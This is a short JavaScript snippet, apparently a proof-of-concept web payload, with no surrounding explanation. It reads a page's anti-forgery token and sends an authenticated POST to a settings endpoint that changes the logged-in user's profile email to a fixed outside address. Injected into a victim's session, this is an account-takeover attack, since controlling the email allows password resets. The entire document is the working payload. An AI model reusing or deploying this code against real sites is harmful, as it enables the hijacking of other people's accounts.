const token =
  document.querySelector('input[name="__RequestVerificationToken"]')?.value;

const fd = new FormData();
fd.append("ProfileInfo.Email", "trey@inspectiv.com");
fd.append("__RequestVerificationToken", token);
fd.append("X-Requested-With", "XMLHttpRequest");

fetch("/Settings?handler=UpdateProfileInfo", {
  method: "POST",
  credentials: "include",
  headers: {
    "X-Requested-With": "XMLHttpRequest"
  },
  body: fd
})
  .then(async r => {
    console.log("status:", r.status);
    console.log(await r.text());
  });
